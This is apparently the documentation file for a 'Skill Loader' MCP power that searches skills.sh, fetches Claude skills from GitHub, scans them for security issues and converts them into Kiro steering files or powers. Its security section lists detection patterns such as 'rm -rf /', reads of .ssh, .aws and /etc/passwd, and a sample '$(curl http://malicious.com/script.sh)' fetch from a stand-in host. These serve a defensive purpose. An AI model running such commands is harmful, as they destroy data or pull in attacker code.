---
name: "skill-loader"
displayName: "Skill Loader"
description: "Discover, fetch, and convert Claude skills from skills.sh and GitHub repositories"
keywords: ["claude", "skills", "agent-skills", "skills.sh", "import", "converter", "steering", "power", "marketplace", "mcp"]
author: "Kiro"
version: "2.0.0"
mcpServers: ["skill-loader"]
---

# Skill Loader Power

## Overview

The Skill Loader Power helps you discover and import Claude skills from the [skills.sh](https://skills.sh) marketplace and GitHub repositories. Claude skills are markdown-based instruction sets that follow the [Agent Skills](https://agentskills.io) standard, providing pre-built workflows and capabilities you can use in Kiro.

This power provides documentation for the Skill Loader MCP Server, which offers 9 tools for:
- **Discovering** skills through search and leaderboards
- **Fetching** skill content from GitHub
- **Validating** skills for security issues
- **Converting** skills to Kiro steering files or powers

Whether you're migrating from Claude, exploring the Agent Skills ecosystem, or looking for pre-built workflows, the Skill Loader makes it easy to bring Claude skills into Kiro.

### Quick Start

Try these commands to get started:

```
# 1. Browse top skills
List the top Claude skills

# 2. Search for specific skills
Search for PDF skills

# 3. Import a skill as steering file
Import pdf-extractor as a steering file

# 4. View trending skills
Show me the trending skills from the last 24 hours
```

### Prerequisites

- **Node.js 18+**: Required to run the MCP server
- **Internet connection**: For accessing skills.sh and GitHub
- **Kiro**: This power works with Kiro's MCP integration


## Installation

The Skill Loader Power uses the Skill Loader MCP Server to provide its functionality. The MCP server is automatically installed when you use the power.

### Step 1: Install the Power

If you're reading this, you've likely already installed the power. If not, install it through Kiro's power management interface.

### Step 2: Verify MCP Server Configuration

The power includes an `mcp.json` file that configures the MCP server. Kiro should automatically detect and use this configuration. The configuration looks like this:

```json
{
  "mcpServers": {
    "skill-loader": {
      "command": "npx",
      "args": ["-y", "@kiro/skill-loader-mcp-server"],
      "description": "MCP server for discovering and converting Claude skills",
      "disabled": false,
      "autoApprove": []
    }
  }
}
```

**Configuration Notes:**
- `npx -y` automatically installs the MCP server on first use
- `disabled: false` means the server is active
- `autoApprove: []` means you'll approve each tool call (recommended for security)

### Step 3: Verify Installation

Try a simple command to verify everything works:

```
List the top 5 Claude skills
```

You should see a list of popular skills from skills.sh. If you see an error, check the troubleshooting section below.

### Node.js Requirements

The MCP server requires **Node.js 18 or higher**. Check your version:

```bash
node --version
```

If you need to update Node.js, visit [nodejs.org](https://nodejs.org).

### Troubleshooting Installation

**Problem: "Command not found" or "npx not found"**
- **Solution**: Install Node.js 18+ from [nodejs.org](https://nodejs.org)
- **Verify**: Run `node --version` and `npx --version`

**Problem: "MCP server failed to start"**
- **Solution 1**: Check your internet connection (npx needs to download the package)
- **Solution 2**: Try manually installing: `npm install -g @kiro/skill-loader-mcp-server`
- **Solution 3**: Check Node.js version is 18+

**Problem: "Permission denied"**
- **Solution**: On macOS/Linux, you may need to use `sudo` or configure npm to install globally without sudo
- **Alternative**: Use `npx` (as configured) which doesn't require global installation

**Problem: Tools not appearing in Kiro**
- **Solution 1**: Restart Kiro to reload MCP configurations
- **Solution 2**: Check that `mcp.json` is in the power directory
- **Solution 3**: Verify `disabled: false` in the configuration


## Available Tools

The Skill Loader provides 9 tools organized into four categories: Discovery, Fetching, Conversion, and Workflow.

### Discovery Tools

These tools help you find skills in the skills.sh marketplace.

#### `list_skills` - Browse All Skills

Lists all available skills with pagination.

**When to Use**: When you want to browse the complete catalog of available skills.

**Example Commands**:
```
List all Claude skills
Show me the first 20 skills
List skills page 2
```

**What You Get**: A paginated list of skills with names, descriptions, owners, repositories, and install counts.

---

#### `search_skills` - Find Skills by Keyword

Searches for skills matching your query.

**When to Use**: When you're looking for skills related to a specific topic or technology.

**Example Commands**:
```
Search for PDF skills
Find skills about React
Search for authentication skills
```

**What You Get**: Skills matching your search, sorted by relevance (install count).

---

#### `get_leaderboard` - View Trending Skills

Shows the most popular or trending skills.

**When to Use**: When you want to discover what's popular or trending in the last 24 hours.

**Example Commands**:
```
Show me the top 10 skills
What are the trending skills?
Show me the leaderboard for the last 24 hours
```

**What You Get**: Top skills ranked by install count, with optional 24-hour trending filter.

---

### Fetching Tools

These tools retrieve skill content from GitHub.

#### `fetch_skill` - Download Skill Content

Fetches the raw content of a skill from GitHub.

**When to Use**: When you want to inspect a skill before importing it.

**Example Commands**:
```
Fetch the pdf-extractor skill
Get the content of anthropics/pdf-extractor
Show me the react-component-builder skill
```

**What You Get**: The complete skill content (markdown with YAML frontmatter), source URL, and metadata.

---

#### `validate_skill` - Check for Security Issues

Validates skill content for dangerous patterns and security issues.

**When to Use**: When you want to verify a skill is safe before importing it.

**Example Commands**:
```
Validate this skill content: [paste content]
Check if this skill is safe
Is this skill secure?
```

**What You Get**: Validation result with severity level (safe/warning/unsafe) and list of any security issues found.

---

### Conversion Tools

These tools convert skills to Kiro formats.

#### `convert_to_steering` - Create Steering File

Converts a skill to Kiro steering file format.

**When to Use**: When you want to use a skill as temporary context for a specific task.

**Example Commands**:
```
Convert this skill to a steering file
Make a steering file from this content
```

**What You Get**: Steering file content with import metadata, suggested filename, and target path (`.kiro/steering/`).

**About Steering Files**: Steering files provide temporary context to Kiro. They're great for one-off tasks or experimenting with skills before making them permanent.

---

#### `convert_to_power` - Create Power

Converts a skill to Kiro power format.

**When to Use**: When you want to permanently integrate a skill into your Kiro environment.

**Example Commands**:
```
Convert this skill to a power
Make a power from this content
```

**What You Get**: Power content (POWER.md) with proper frontmatter, power name (kebab-case), and target path (`~/.kiro/powers/`).

**About Powers**: Powers are permanent integrations that become part of your Kiro environment. Use this for skills you'll use regularly.

---

### Workflow Tools

These tools combine multiple steps into a single command.

#### `import_skill` - Complete Import Workflow

Fetches, validates, and converts a skill in one command.

**When to Use**: When you want to quickly import a skill without manual steps.

**Example Commands**:
```
Import pdf-extractor as a steering file
Import anthropics/react-builder as a power
Import the web-scraper skill
```

**What You Get**: Complete import with validation, conversion, and ready-to-use content.

**The Process**:
1. **Fetch**: Downloads skill from GitHub
2. **Validate**: Checks for security issues (blocks unsafe skills)
3. **Convert**: Transforms to your chosen format (steering or power)
4. **Return**: Provides converted content ready to save

**Security Note**: By default, import blocks skills that fail security validation. You can skip validation with `skipValidation: true`, but this is not recommended.


## Common Workflows

### Workflow 1: Discover and Import a Skill

**Goal**: Find a skill and import it quickly.

**Steps**:

1. **Search for skills**:
   ```
   Search for PDF skills
   ```
   
   You'll see skills like `pdf-extractor`, `pdf-analyzer`, etc.

2. **Import the skill**:
   ```
   Import pdf-extractor as a steering file
   ```
   
   The skill is fetched, validated, and converted automatically.

3. **Use the skill**:
   ```
   Use the pdf-extractor skill to extract text from document.pdf
   ```

**Complete Example**:
```
User: Search for PDF skills

Kiro: Found 5 PDF-related skills:
1. pdf-extractor (anthropics/skills) - Extract text from PDF files - 30,400 installs
2. pdf-analyzer (vercel-labs/agent-skills) - Analyze PDF structure - 12,300 installs
...

User: Import pdf-extractor as a steering file

Kiro: ✓ Fetched skill from GitHub
✓ Security validation passed (safe)
✓ Converted to steering file
Imported as: .kiro/steering/pdf-extractor.md

User: Extract text from my-document.pdf using the pdf-extractor skill

Kiro: [Uses the imported skill to extract text]
```

**Tips**:
- Use steering files for one-off tasks
- Use powers for skills you'll use regularly
- Always check the security validation results

---

### Workflow 2: Search and Validate Before Import

**Goal**: Carefully inspect a skill before importing it.

**Steps**:

1. **Search for the skill**:
   ```
   Search for authentication skills
   ```

2. **Fetch the skill content**:
   ```
   Fetch the oauth-handler skill
   ```
   
   Review the content to understand what it does.

3. **Validate security**:
   ```
   Validate the oauth-handler skill
   ```
   
   Check for any security warnings.

4. **Import if safe**:
   ```
   Import oauth-handler as a power
   ```

**Complete Example**:
```
User: Search for authentication skills

Kiro: Found 3 authentication skills:
1. oauth-handler - Handle OAuth flows - 8,500 installs
2. jwt-validator - Validate JWT tokens - 6,200 installs
...

User: Fetch the oauth-handler skill

Kiro: [Shows full skill content with YAML frontmatter and instructions]

User: Validate this skill

Kiro: Security validation: SAFE
✓ No dangerous commands
✓ No suspicious file operations
✓ Trusted source (github.com/anthropics/skills)

User: Import oauth-handler as a power

Kiro: ✓ Imported as power: ~/.kiro/powers/oauth-handler/POWER.md
```

**Tips**:
- Always validate skills from unknown sources
- Review the skill content to understand what it does
- Check the install count as a trust indicator

---

### Workflow 3: Browse Trending Skills

**Goal**: Discover what's popular in the community.

**Steps**:

1. **View the leaderboard**:
   ```
   Show me the trending skills from the last 24 hours
   ```

2. **Pick an interesting skill**:
   ```
   Tell me more about the top skill
   ```

3. **Import it**:
   ```
   Import that skill as a steering file
   ```

**Complete Example**:
```
User: Show me the trending skills from the last 24 hours

Kiro: Top 10 trending skills (24h):
1. 🔥 web-scraper - Extract data from websites - 45,200 installs (+2,300 today)
2. 🔥 api-tester - Test REST APIs - 38,900 installs (+1,800 today)
3. 🔥 code-reviewer - Review code for issues - 35,600 installs (+1,500 today)
...

User: Tell me more about web-scraper

Kiro: [Fetches and shows skill details]

User: Import web-scraper as a steering file

Kiro: ✓ Imported successfully
```

**Tips**:
- Trending skills are often high-quality and well-maintained
- High install counts indicate community trust
- Check the description to see if it matches your needs

---

### Workflow 4: Batch Import Multiple Skills

**Goal**: Import several related skills at once.

**Steps**:

1. **Search for related skills**:
   ```
   Search for React skills
   ```

2. **Import each one**:
   ```
   Import react-component-builder as a power
   Import react-hooks-helper as a power
   Import react-testing-guide as a steering file
   ```

3. **Verify imports**:
   ```
   List my imported powers
   ```

**Complete Example**:
```
User: Search for React skills

Kiro: Found 8 React skills:
1. react-component-builder - Build React components - 15,400 installs
2. react-hooks-helper - React hooks patterns - 12,800 installs
3. react-testing-guide - Test React apps - 10,200 installs
...

User: Import react-component-builder as a power

Kiro: ✓ Imported as power

User: Import react-hooks-helper as a power

Kiro: ✓ Imported as power

User: Import react-testing-guide as a steering file

Kiro: ✓ Imported as steering file

User: List my React powers

Kiro: You have 2 React powers:
- react-component-builder
- react-hooks-helper
```

**Tips**:
- Import related skills together for a complete workflow
- Use powers for core skills, steering files for reference guides
- You can import the same skill in both formats if needed


## Tool Reference

Detailed documentation for each tool with input/output schemas and examples.

### list_skills

**Purpose**: List all available skills from skills.sh with pagination.

**Input Parameters**:

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| page | number | No | Page number (default: 1) |
| pageSize | number | No | Results per page (default: 50, max: 100) |

**Output**:
```json
{
  "skills": [
    {
      "name": "skill-name",
      "description": "Skill description",
      "owner": "github-owner",
      "repo": "repository-name",
      "installs": 12345
    }
  ],
  "total": 150,
  "page": 1,
  "pageSize": 50
}
```

**Example Usage**:
```
User: List the first 10 skills

Kiro: Here are the first 10 skills:
1. pdf-extractor - Extract text from PDF files (30,400 installs)
2. web-scraper - Extract data from websites (45,200 installs)
...
```

**Common Issues**:
- **Empty results**: The skills.sh directory might be temporarily unavailable. Try again in a few minutes.
- **Slow response**: First request caches the directory (may take 5-10 seconds). Subsequent requests are fast.

---

### search_skills

**Purpose**: Search for skills by keyword.

**Input Parameters**:

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| query | string | Yes | Search query (keyword or phrase) |
| limit | number | No | Max results (default: 20, max: 50) |

**Output**:
```json
{
  "skills": [
    {
      "name": "skill-name",
      "description": "Skill description",
      "owner": "github-owner",
      "repo": "repository-name",
      "installs": 12345,
      "relevance": 5
    }
  ],
  "query": "search-term",
  "count": 5
}
```

**Example Usage**:
```
User: Search for React skills

Kiro: Found 8 React skills:
1. react-component-builder - Build React components (15,400 installs)
2. react-hooks-helper - React hooks patterns (12,800 installs)
...
```

**Common Issues**:
- **No results**: Try broader search terms (e.g., "web" instead of "webpack")
- **Too many results**: Use more specific terms or reduce the limit

---

### get_leaderboard

**Purpose**: Get trending or top-installed skills.

**Input Parameters**:

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| timeframe | string | No | 'all' or '24h' (default: 'all') |
| limit | number | No | Max results (default: 20, max: 50) |

**Output**:
```json
{
  "skills": [
    {
      "name": "skill-name",
      "description": "Skill description",
      "owner": "github-owner",
      "repo": "repository-name",
      "installs": 12345,
      "rank": 1,
      "trending": true
    }
  ],
  "timeframe": "24h",
  "count": 10
}
```

**Example Usage**:
```
User: Show me the top 10 trending skills

Kiro: Top 10 trending skills (24h):
1. 🔥 web-scraper - Extract data from websites (45,200 installs, +2,300 today)
2. 🔥 api-tester - Test REST APIs (38,900 installs, +1,800 today)
...
```

**Common Issues**:
- **No trending data**: The 24h timeframe requires recent data. Fall back to 'all' if unavailable.

---

### fetch_skill

**Purpose**: Fetch raw skill content from GitHub.

**Input Parameters**:

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| identifier | string | Yes | Skill name or owner/repo format |

**Output**:
```json
{
  "content": "---\nname: Skill Name\n---\n\n# Content",
  "url": "https://raw.githubusercontent.com/...",
  "metadata": {
    "name": "skill-name",
    "owner": "github-owner",
    "repo": "repository-name",
    "skillPath": "skills/skill-name",
    "fetchedAt": "2024-01-15T10:30:00.000Z"
  }
}
```

**Example Usage**:
```
User: Fetch the pdf-extractor skill

Kiro: [Shows full skill content with YAML frontmatter and markdown]
```

**Common Issues**:
- **Skill not found**: Verify the skill name exists in skills.sh
- **Network error**: Check internet connection and GitHub availability
- **Ambiguous name**: Use owner/repo format (e.g., "anthropics/pdf-extractor")

---

### validate_skill

**Purpose**: Validate skill content for security issues.

**Input Parameters**:

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| content | string | Yes | Skill content to validate |
| url | string | No | Source URL for verification |

**Output**:
```json
{
  "isValid": true,
  "issues": [],
  "severity": "safe"
}
```

**Example Usage**:
```
User: Validate this skill: [paste content]

Kiro: Security validation: SAFE
✓ No dangerous commands
✓ No suspicious file operations
✓ No code injection patterns
✓ Trusted source
```

**Unsafe Example**:
```
User: Validate this skill: [paste content with rm -rf]

Kiro: Security validation: UNSAFE
✗ Dangerous recursive delete command (rm -rf)
Location: Line 10

This skill should NOT be imported.
```

**Common Issues**:
- **False positives**: Some legitimate skills may trigger warnings. Review carefully.
- **Missing URL**: Provide source URL for better validation

---

### convert_to_steering

**Purpose**: Convert skill to Kiro steering file format.

**Input Parameters**:

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| content | string | Yes | Skill content to convert |
| sourceUrl | string | No | Original source URL |

**Output**:
```json
{
  "steeringContent": "---\noriginal_skill: ...\n---\n\n...",
  "filename": "skill-name.md",
  "metadata": {
    "originalSkill": "Skill Name",
    "sourceUrl": "https://...",
    "importedAt": "2024-01-15T10:30:00.000Z"
  }
}
```

**Example Usage**:
```
User: Convert this skill to a steering file

Kiro: Converted to steering file: pdf-extractor.md
Target path: .kiro/steering/pdf-extractor.md
```

**Common Issues**:
- **Parsing error**: Skill must have valid YAML frontmatter
- **Missing name**: Skill must have a name in frontmatter

---

### convert_to_power

**Purpose**: Convert skill to Kiro power format.

**Input Parameters**:

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| content | string | Yes | Skill content to convert |
| sourceUrl | string | No | Original source URL |

**Output**:
```json
{
  "powerContent": "---\nname: skill-name\n---\n\n...",
  "powerName": "skill-name",
  "metadata": {
    "originalSkill": "Skill Name",
    "sourceUrl": "https://...",
    "importedAt": "2024-01-15T10:30:00.000Z"
  }
}
```

**Example Usage**:
```
User: Convert this skill to a power

Kiro: Converted to power: pdf-extractor
Target path: ~/.kiro/powers/pdf-extractor/POWER.md
```

**Common Issues**:
- **Parsing error**: Skill must have valid YAML frontmatter
- **Name collision**: Power name already exists. Choose a different name.

---

### import_skill

**Purpose**: Complete import workflow (fetch + validate + convert).

**Input Parameters**:

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| identifier | string | Yes | Skill identifier |
| outputFormat | string | Yes | 'steering' or 'power' |
| skipValidation | boolean | No | Skip security validation (default: false) |

**Output**:
```json
{
  "success": true,
  "content": "...",
  "filename": "skill-name.md",
  "targetPath": ".kiro/steering/skill-name.md",
  "metadata": {
    "skillName": "Skill Name",
    "sourceUrl": "https://...",
    "outputFormat": "steering",
    "validationResult": {
      "isValid": true,
      "issues": [],
      "severity": "safe"
    }
  }
}
```

**Example Usage**:
```
User: Import pdf-extractor as a steering file

Kiro: ✓ Fetched from GitHub
✓ Security validation passed
✓ Converted to steering file
Imported: .kiro/steering/pdf-extractor.md
```

**Failed Import Example**:
```
User: Import dangerous-skill as a power

Kiro: ✗ Import failed
Security validation: UNSAFE
- Dangerous command detected: rm -rf /

This skill was NOT imported for your safety.
```

**Common Issues**:
- **Validation failure**: Skill contains dangerous patterns. Review issues before proceeding.
- **Network error**: Check internet connection
- **Skill not found**: Verify skill name in skills.sh


## Security

The Skill Loader includes comprehensive security validation to protect you from malicious or dangerous skills.

### Security Validation Process

When you import a skill, the Skill Loader automatically:

1. **Scans the content** for dangerous patterns
2. **Checks the source** to verify it's from a trusted repository
3. **Assigns a severity level** (safe, warning, unsafe)
4. **Blocks unsafe imports** unless explicitly overridden

This happens automatically with the `import_skill` tool and can be done manually with `validate_skill`.

### Security Checks Performed

#### 1. Dangerous Commands

Detects commands that could harm your system:

- **Recursive deletes**: `rm -rf`, `del /s`, `Remove-Item -Recurse`
- **Privilege escalation**: `sudo`, `su`, `runas`
- **Code execution**: `eval`, `exec`, `system()`, `shell_exec()`
- **Process manipulation**: `kill -9`, `pkill`, `taskkill /f`

**Example**:
```
✗ Dangerous command detected: rm -rf /tmp/*
Location: Line 45
Severity: UNSAFE
```

#### 2. Suspicious File Operations

Detects access to sensitive system directories:

- **System directories**: `/etc/`, `/usr/`, `/bin/`, `/sbin/`
- **Windows system**: `C:\Windows\`, `C:\Program Files\`
- **Hidden files**: Operations on `.ssh/`, `.aws/`, `.env`

**Example**:
```
✗ Suspicious file operation: /etc/passwd
Location: Line 23
Severity: WARNING
```

#### 3. Code Injection Patterns

Detects patterns that could execute arbitrary code:

- **Shell substitution**: `$(command)`, `` `command` ``
- **Variable expansion**: `${variable}`
- **Template injection**: `{{code}}`, `<%= code %>`

**Example**:
```
✗ Code injection pattern: $(curl malicious.com)
Location: Line 67
Severity: UNSAFE
```

#### 4. Source Verification

Verifies the skill comes from a trusted source:

- **Trusted**: GitHub repositories (github.com, raw.githubusercontent.com)
- **Untrusted**: Unknown domains, localhost, IP addresses

**Example**:
```
✗ Untrusted source: http://suspicious-site.com/skill.md
Severity: WARNING
```

### Severity Levels

#### SAFE ✓

No security issues detected. The skill is safe to import.

```
Security validation: SAFE
✓ No dangerous commands
✓ No suspicious file operations
✓ No code injection patterns
✓ Trusted source (github.com)
```

#### WARNING ⚠️

Minor issues detected. Review carefully before importing.

```
Security validation: WARNING
⚠ Suspicious file operation: ~/.config/app.conf
⚠ Untrusted source: http://example.com

Review these issues before importing.
```

**When to proceed**: If you understand the warnings and trust the source.

#### UNSAFE ✗

Serious security issues detected. Import is blocked.

```
Security validation: UNSAFE
✗ Dangerous command: rm -rf /
✗ Code injection: $(curl malicious.com)

This skill was NOT imported for your safety.
```

**When to proceed**: Almost never. Only if you've thoroughly reviewed the code and understand the risks.

### Handling Security Issues

#### For SAFE Skills

Import normally:
```
Import pdf-extractor as a steering file
```

#### For WARNING Skills

Review the warnings, then decide:
```
User: Import custom-skill as a power

Kiro: ⚠ Security warning: Accesses ~/.config/
Do you want to proceed? (Review the skill first)

User: Yes, I trust this skill

Kiro: ✓ Imported (you accepted the warning)
```

#### For UNSAFE Skills

**Do NOT import** unless you've thoroughly reviewed the code:
```
User: Import dangerous-skill as a power

Kiro: ✗ Import blocked
Security validation: UNSAFE
- Dangerous command: rm -rf /

This skill was NOT imported for your safety.
```

To override (not recommended):
```
Import dangerous-skill with skipValidation: true
```

### Security Best Practices

1. **Always review validation results** before importing
2. **Check the source** - prefer skills from official repositories (anthropics, vercel-labs)
3. **Look at install counts** - popular skills are more likely to be safe
4. **Read the skill content** before importing (use `fetch_skill`)
5. **Start with steering files** - they're temporary and easier to remove
6. **Never skip validation** for skills from unknown sources
7. **Report suspicious skills** to the skills.sh maintainers

### Example: Safe Import Workflow

```
User: Search for PDF skills

Kiro: Found 5 PDF skills...

User: Fetch pdf-extractor

Kiro: [Shows skill content]

User: Validate this skill

Kiro: Security validation: SAFE
✓ All checks passed

User: Import pdf-extractor as a steering file

Kiro: ✓ Imported successfully
```

### Example: Handling Warnings

```
User: Import custom-config-tool as a power

Kiro: ⚠ Security validation: WARNING
- Accesses ~/.config/app.conf
- Modifies user configuration files

Review the skill content:
[Shows relevant code sections]

Do you want to proceed?

User: Show me the exact code that accesses .config

Kiro: [Shows specific lines]

User: That looks safe, proceed with import

Kiro: ✓ Imported (warning accepted)
```

### What Security Validation Does NOT Do

- **Does not execute code** - Only scans for patterns
- **Does not guarantee safety** - Sophisticated attacks may evade detection
- **Does not check dependencies** - Only validates the skill content itself
- **Does not monitor runtime** - Only validates at import time

**Always exercise caution** when importing skills, especially from unknown sources.


## Examples

### Example 1: Quick Import

**Scenario**: You want to quickly import a popular skill.

**Commands**:
```
User: Import pdf-extractor as a steering file

Kiro: ✓ Fetched from anthropics/skills
✓ Security validation: SAFE
✓ Converted to steering file
Imported: .kiro/steering/pdf-extractor.md

Ready to use! Try: "Extract text from document.pdf"
```

**Result**: Skill imported and ready to use in seconds.

**Key Takeaways**:
- `import_skill` handles everything in one command
- Security validation happens automatically
- Steering files are ready to use immediately

---

### Example 2: Browse and Discover

**Scenario**: You want to explore what skills are available.

**Commands**:
```
User: List the top 10 skills

Kiro: Top 10 skills by install count:
1. pdf-extractor - Extract text from PDF files (30,400 installs)
2. web-scraper - Extract data from websites (45,200 installs)
3. api-tester - Test REST APIs (38,900 installs)
4. code-reviewer - Review code for issues (35,600 installs)
5. sql-query-builder - Build SQL queries (28,300 installs)
6. markdown-formatter - Format markdown documents (25,100 installs)
7. json-validator - Validate JSON schemas (22,800 installs)
8. regex-helper - Build and test regex patterns (20,500 installs)
9. git-helper - Git workflow assistance (19,200 installs)
10. docker-composer - Docker compose helper (17,900 installs)

User: Tell me more about web-scraper

Kiro: [Fetches and shows skill details]

User: Import web-scraper as a power

Kiro: ✓ Imported as power
```

**Result**: Discovered and imported a useful skill.

**Key Takeaways**:
- `list_skills` shows the most popular skills
- High install counts indicate quality and trust
- You can fetch details before importing

---

### Example 3: Search for Specific Skills

**Scenario**: You need a skill for a specific task.

**Commands**:
```
User: Search for React skills

Kiro: Found 8 React skills:
1. react-component-builder - Build React components (15,400 installs)
2. react-hooks-helper - React hooks patterns (12,800 installs)
3. react-testing-guide - Test React apps (10,200 installs)
4. react-state-manager - State management patterns (8,900 installs)
5. react-performance - Performance optimization (7,600 installs)
...

User: Import react-component-builder as a power

Kiro: ✓ Imported successfully
```

**Result**: Found and imported exactly what you needed.

**Key Takeaways**:
- `search_skills` finds relevant skills quickly
- Results are sorted by relevance (install count)
- You can import directly from search results

---

### Example 4: Validate Before Importing

**Scenario**: You want to check a skill's safety before importing.

**Commands**:
```
User: Fetch the custom-automation skill

Kiro: [Shows skill content]

User: Validate this skill

Kiro: Security validation: WARNING
⚠ Accesses system files: ~/.bashrc
⚠ Modifies shell configuration

Review the skill content carefully before importing.

User: Show me the lines that access .bashrc

Kiro: Lines 34-38:
```bash
# Add alias to .bashrc
echo "alias mycommand='...'" >> ~/.bashrc
```

User: That looks safe for my use case. Import it as a steering file

Kiro: ✓ Imported (warning accepted)
```

**Result**: Safely imported after reviewing warnings.

**Key Takeaways**:
- Always validate skills from unknown sources
- Review warnings before proceeding
- You can inspect specific code sections

---

### Example 5: Trending Skills

**Scenario**: You want to see what's popular right now.

**Commands**:
```
User: Show me the trending skills from the last 24 hours

Kiro: Top 10 trending skills (24h):
1. 🔥 ai-prompt-optimizer - Optimize AI prompts (12,300 installs, +890 today)
2. 🔥 code-explainer - Explain code in plain English (10,800 installs, +720 today)
3. 🔥 test-generator - Generate unit tests (9,500 installs, +650 today)
...

User: Import ai-prompt-optimizer as a steering file

Kiro: ✓ Imported successfully
```

**Result**: Discovered and imported a trending skill.

**Key Takeaways**:
- Trending skills show what's popular now
- Great way to discover new, useful skills
- High daily growth indicates active use

---

### Example 6: Import as Power vs Steering File

**Scenario**: You want to understand when to use each format.

**Commands**:
```
User: Import pdf-extractor as a steering file

Kiro: ✓ Imported to .kiro/steering/pdf-extractor.md
This is a temporary context file.

User: I use this skill often. Can I make it permanent?

Kiro: Yes! Import it as a power instead:

User: Import pdf-extractor as a power

Kiro: ✓ Imported to ~/.kiro/powers/pdf-extractor/POWER.md
This is now a permanent power in your Kiro environment.
```

**Result**: Understood the difference and imported appropriately.

**Key Takeaways**:
- Steering files: temporary, for one-off tasks
- Powers: permanent, for regular use
- You can have both formats of the same skill

---

### Example 7: Handling Import Failures

**Scenario**: An import fails due to security issues.

**Commands**:
```
User: Import suspicious-skill as a power

Kiro: ✗ Import failed
Security validation: UNSAFE

Issues found:
1. Dangerous command: rm -rf /tmp/*
   Location: Line 45
   
2. Code injection: $(curl http://malicious.com/script.sh)
   Location: Line 67

This skill was NOT imported for your safety.

User: Can I see the full content?

Kiro: [Shows full skill content with issues highlighted]

User: This is definitely malicious. Thanks for blocking it!

Kiro: You're welcome! Always review skills from unknown sources.
```

**Result**: Dangerous skill blocked, user protected.

**Key Takeaways**:
- Security validation protects you automatically
- Unsafe skills are blocked by default
- You can review the issues before deciding

---

### Example 8: Batch Import for a Project

**Scenario**: You're starting a new project and need multiple skills.

**Commands**:
```
User: I'm building a web API. What skills should I import?

Kiro: For web API development, consider these skills:
- api-tester (testing)
- openapi-generator (documentation)
- auth-helper (authentication)
- database-query-builder (database)

User: Import api-tester as a power

Kiro: ✓ Imported

User: Import openapi-generator as a power

Kiro: ✓ Imported

User: Import auth-helper as a power

Kiro: ✓ Imported

User: Import database-query-builder as a steering file

Kiro: ✓ Imported

User: List my imported powers

Kiro: You have 3 API-related powers:
- api-tester
- openapi-generator
- auth-helper
```

**Result**: Complete skill set for the project.

**Key Takeaways**:
- Import multiple related skills together
- Mix powers and steering files based on usage
- Build a complete workflow toolkit

---

### Example 9: Exploring Skill Content

**Scenario**: You want to understand what a skill does before importing.

**Commands**:
```
User: Search for testing skills

Kiro: Found 6 testing skills:
1. test-generator - Generate unit tests (9,500 installs)
2. api-tester - Test REST APIs (38,900 installs)
...

User: Fetch test-generator

Kiro: [Shows complete skill content]

---
name: Test Generator
description: Generate unit tests for your code
---

# Test Generator

This skill helps you generate comprehensive unit tests...

[Full content shown]

User: This looks perfect! Import test-generator as a power

Kiro: ✓ Imported successfully
```

**Result**: Fully understood the skill before importing.

**Key Takeaways**:
- `fetch_skill` shows complete content
- Review before importing to ensure it fits your needs
- Skill descriptions may not tell the whole story

---

### Example 10: Converting Formats

**Scenario**: You want to convert a skill to a different format.

**Commands**:
```
User: I have a skill as a steering file, but I use it all the time. Can I convert it to a power?

Kiro: Yes! Just import it again as a power:

User: Import pdf-extractor as a power

Kiro: ✓ Imported to ~/.kiro/powers/pdf-extractor/POWER.md

You now have both formats:
- Steering file: .kiro/steering/pdf-extractor.md
- Power: ~/.kiro/powers/pdf-extractor/POWER.md

You can remove the steering file if you don't need it.
```

**Result**: Skill converted to permanent power.

**Key Takeaways**:
- You can have both formats simultaneously
- Re-import to convert between formats
- Remove the old format if you don't need it

---

### Example 11: Error Handling

**Scenario**: Something goes wrong during import.

**Commands**:
```
User: Import nonexistent-skill as a power

Kiro: ✗ Error: Skill not found

The skill "nonexistent-skill" doesn't exist in skills.sh.

Suggestions:
- Check the spelling
- Search for similar skills: "Search for [keyword]"
- Browse all skills: "List all skills"

User: Search for similar skills

Kiro: Did you mean one of these?
- pdf-extractor
- text-extractor
- data-extractor

User: Import pdf-extractor as a power

Kiro: ✓ Imported successfully
```

**Result**: Error resolved with helpful suggestions.

**Key Takeaways**:
- Clear error messages help you fix issues
- Suggestions guide you to the right solution
- Search helps find the correct skill name

---

### Example 12: Using Imported Skills

**Scenario**: You've imported a skill and want to use it.

**Commands**:
```
User: Import pdf-extractor as a steering file

Kiro: ✓ Imported to .kiro/steering/pdf-extractor.md

User: Extract text from my-document.pdf

Kiro: [Uses the pdf-extractor skill to extract text]

Here's the extracted text:
[Document content]

User: That worked great! Now extract text from another-doc.pdf

Kiro: [Uses the skill again]
[Extracted content]
```

**Result**: Skill used successfully for multiple tasks.

**Key Takeaways**:
- Imported skills are immediately available
- Kiro automatically uses relevant skills
- Skills work for multiple similar tasks


## Troubleshooting

### Issue: MCP Server Connection Failed

**Problem**: The MCP server won't start or connect.

**Symptoms**:
```
Error: Failed to connect to skill-loader MCP server
Error: Command not found: npx
Error: MCP server timeout
```

**Causes**:
- Node.js not installed or version too old
- npx not available
- Network issues preventing package download
- MCP server crashed

**Solutions**:

1. **Check Node.js installation**:
   ```bash
   node --version
   ```
   Should show v18.0.0 or higher. If not, install from [nodejs.org](https://nodejs.org).

2. **Check npx availability**:
   ```bash
   npx --version
   ```
   Should show a version number. If not, reinstall Node.js.

3. **Manually install the MCP server**:
   ```bash
   npm install -g @kiro/skill-loader-mcp-server
   ```
   Then update mcp.json to use `skill-loader-mcp-server` instead of `npx`.

4. **Check internet connection**:
   ```bash
   ping github.com
   ```
   Ensure you can reach GitHub and npm registry.

5. **Restart Kiro**:
   Sometimes a simple restart resolves connection issues.

**Prevention**:
- Keep Node.js updated
- Ensure stable internet connection
- Use global installation for offline reliability

---

### Issue: Skill Not Found

**Problem**: The skill you're trying to import doesn't exist.

**Symptoms**:
```
Error: Skill "xyz" not found in skills.sh
Error: Could not resolve skill identifier
Error: 404 Not Found
```

**Causes**:
- Typo in skill name
- Skill removed from skills.sh
- Skill exists but under different name
- Using wrong owner/repo format

**Solutions**:

1. **Search for the skill**:
   ```
   Search for [keyword] skills
   ```
   Find the correct name.

2. **List all skills**:
   ```
   List all skills
   ```
   Browse to find the right one.

3. **Check the spelling**:
   Common mistakes:
